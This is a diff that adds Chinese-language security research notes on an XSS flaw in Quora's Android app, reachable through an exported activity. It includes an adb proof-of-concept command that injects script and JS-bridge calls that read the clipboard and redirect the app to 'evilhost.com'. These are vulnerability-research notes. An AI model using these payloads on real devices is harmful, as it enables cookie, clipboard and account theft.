@@ -221,3 +221,19 @@ net.gotev.uploadservice.UploadService，UploadService组件 enabled 且 exported
 Quora 		ok
 Instant App ok
 
+## Quora 导出组件导致的XSS
+xss可以偷cookie，登陆账号，本质上为可以执行任意js代码，那么，就可以访问cookie然后回传。
+
+poc:
+  am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
+  
+可以加载第三方js
+可以通过一些定义的js接口做一些事情，例如获取剪切板内容
+QuoraAndroid.getClipboardData()
+QuoraAndroid.sendMessage(
+"{\"messageName\":\"switchInstance\",\"data\":{\"host\":\"evilhost.com\",\"instance_name\":\"evilhost\",\"scheme\":\"https\"}}"
+);
+change the server address.
+
+extra:
+https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/
